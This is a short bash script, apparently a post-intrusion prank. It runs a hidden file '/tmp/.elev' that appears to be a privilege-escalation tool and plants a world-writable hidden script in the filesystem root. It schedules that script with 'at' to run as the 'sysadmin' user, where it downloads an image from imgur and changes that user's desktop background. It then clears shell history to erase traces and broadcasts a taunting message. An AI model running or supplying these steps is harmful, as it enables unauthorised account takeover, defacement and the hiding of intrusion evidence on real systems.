#!/bin/bash
cd /tmp/ && ./.elev 
whoami && cd / && printf "#!/bin/bash \n cd ~sysadmin && wget https://i.imgur.com/cYaz163.png && gsettings set org.gnome.desktop.background picture-uri file:///home/sysadmin/cYaz163.png" > .file.sh && chmod 777 .file.sh && echo "cd / && su sysadmin -c /.file.sh" | at -m now + 1 minute && whoami && history -c && wall "background check?"
